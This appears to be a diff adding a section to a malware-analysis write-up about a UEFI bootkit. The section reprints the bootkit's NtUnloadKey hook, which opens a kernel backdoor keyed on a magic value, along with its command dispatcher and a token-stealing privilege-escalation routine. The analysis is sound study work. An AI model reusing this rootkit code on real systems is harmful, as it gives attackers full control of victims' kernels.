@@ -283,4 +283,118 @@ VOID EFIAPI NotifySetVirtualAddressMap(EFI_EVENT Event, VOID* Context)
 
 If you recall, this is a callback we assigned at the beginning of this analysis! Why is it necessary?  
 Well, up till this point, all the addresses we were dealing with were physcal addresses, but now, with `NtUnloadKey`, we'd like to hook virtual addresses.  
-Therefore, we'd like to get the pointer to `NtUnloadKeyHook` *in virtual addresses*, which we do get by calling the `ConvertPointer` UEFI service!
+Therefore, we'd like to get the pointer to `NtUnloadKeyHook` *in virtual addresses*, which we do get by calling the `ConvertPointer` UEFI service!  
+There is one more subtle point here - note in `trampoline::Hook` we supply `0` to specify we are not interested in storing the original 12 bytes of the `NtUnloadKey` function. This looks very odd since the natural thing would be unhooking and calling it, but there is a good reason for it, which we will cover now.
+
+### The logic of NtUnloadKey
+The behavior of the original `NtUnloadKey` is really to call `CmUnloadKey`:
+
+```c
+NTSYSAPI 
+NTSTATUS
+NTAPI
+NtUnloadKey(
+    IN POBJECT_ATTRIBUTES DestinationKeyName
+)
+{
+    return CmUnloadKey(DestinationKeyName, 0, 0, 0);
+}
+```
+
+Because of that, when our hook wants to call the original `NtUnloadKey`, it skips a stage and simply calls `CmUnloadKey`. That's the reason we did not need to save the original 12 bytes, and also the reason we were interested in `CmUnloadKey` to begin with. Neat!  
+Let's examine the `NtUnloadKeyHook` implementation under `Bootkit/NtUnloadKey.cpp`:
+
+```c
+uint64_t NtUnloadKeyHook(uint64_t a1)
+{
+    command_t cmd = *(command_t*)a1;
+
+    if (cmd.magic == command_magic)
+    {
+        return dispatcher::Start(cmd);
+    }
+
+    return ((uint64_t(*)(uint64_t, uint32_t, uint8_t, uint64_t))global::CmUnloadKey)(a1, 0LL, 0LL, 0LL);
+}
+```
+
+Easy - this calls the original `CmUnloadKey` with the first argument (and the 3 zeros we've seen earlier) unless the argument that was sent contains some magic value known to the userland part of the bootloader.  
+Essentially, `NtUnloadKeyHook` implements a backdoor at the kernel that anyone would be able to run.  
+To complete the picture:
+
+```c
+#define command_magic 0xDEAD
+
+enum command_type
+{
+    CopyKernelMemory,
+    ReadProcessMemory,
+    WriteProcessMemory,
+    KillProcess,
+    PrivilegeEscalation
+};
+
+struct command_t
+{
+	uint16_t magic;
+    command_type type;
+    uint64_t data[10];
+};
+```
+
+The magic should be simply `0xDEAD` constant, and there are several command types - the names are pretty self explanatory.  
+Let's examine the `PrivilegeEscalation` command since it's the most interesting one, and with that in mind, examine `dispatcher::Start` under `Bootkit/dispatcher.cpp`:
+
+```c
+uint64_t dispatcher::Start(command_t cmd)
+{
+	switch (cmd.type)
+	{
+	case ::CopyKernelMemory:
+		return CopyKernelMemory(cmd.data);
+	case ::ReadProcessMemory:
+		return ReadProcessMemory(cmd.data);
+	case ::WriteProcessMemory:
+		return WriteProcessMemory(cmd.data);
+	case ::KillProcess:
+		return KillProcess(cmd.data);
+	case ::PrivilegeEscalation:
+		return PrivilegeEscalation(cmd.data);
+	}
+}
+
+...
+
+uint64_t dispatcher::PrivilegeEscalation(uint64_t data[10])
+{
+	uint64_t pid = data[0];
+	Log("pid -> %p", pid);
+
+	uint64_t PsLookupProcessByProcessId = memory::get_export_address(global::ntoskrnl, "PsLookupProcessByProcessId");
+
+	uint64_t target_peprocess = 0;
+	uint64_t system_peprocess = 0;
+
+	((uint64_t(*)(uint64_t, uint64_t*))PsLookupProcessByProcessId)(pid, &target_peprocess);
+	((uint64_t(*)(uint64_t, uint64_t*))PsLookupProcessByProcessId)(4,   &system_peprocess);
+
+	uint64_t system_token = 0;
+	/* getting system token from ntoskrnl.exe */
+	memory::copy((uint64_t*)((uint8_t*)system_peprocess + 0x4b8 /* ->Token */), &system_token, sizeof(uint64_t) /* sizeof(_EX_FAST_REF) */);
+	Log("system_token  -> %p", system_token);
+	memory::copy(&system_token, (uint64_t*)((uint8_t*)target_peprocess + 0x4b8 /* ->Token */), sizeof(uint64_t) /* sizeof(_EX_FAST_REF) */);
+
+	return 0;
+}
+```
+
+The `dispatcher::Start` command will call `dispatcher::PrivilegeEscalation` (assuming the `PrivilegeEscalation = 4` command was given to `NtUnloadKey`).  
+From there, it seems we get a target process ID (`pid`) from the user and perform the following:
+1. Find the function pointer of `PsLookupProcessByProcessId` from `ntoskrnl.exe` by walking the PE export table.
+2. Call `PsLookupProcessByProcessId` on the target process ID to get a pointer to its `EPROCESS`, which is a Windows kernel data that contains metadata about the process, including its privileges.
+3. Similarly call `PsLookupProcessByProcessId` on process ID = 4. This process ID is always called `System` and has high privileges.
+4. The privileges in `EPROCESS` are saved in a structure called a `Token`. Generally `EPROCESS` is an undocumented opaque structure, but have been [extensively reverse engineered](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm). As you can see in the link I shared - the token is in offset of `0x4b8` bytes from the start of the `EPROCESS`, but it might change in the future between Windows OS builds. We copy that token to a 64-bit variable.
+5. Simply paste the token we saved to the target process `EPROCESS` at the same offset, essentially setting its `Token` to be exactly equal to the `System` process token, giving it high privileges.
+
+This is a bit dangerous since the `0x4b8` offset might change between Windows build versions - I have a better technique that I used to use in the past that dynamically resolves the token offset based on how it's supposed to look like and finding it similarly to the memory search approach the author of this bootkit has done for finding function patterns in modules.  
+With this, a userland program can simply call `NtUnloadKey` (which is a System service which normally comes from `ntdll.dll`) and supply the command they wish to run. With arbitrary read and write abilities, the userland process can control the entire kernel!
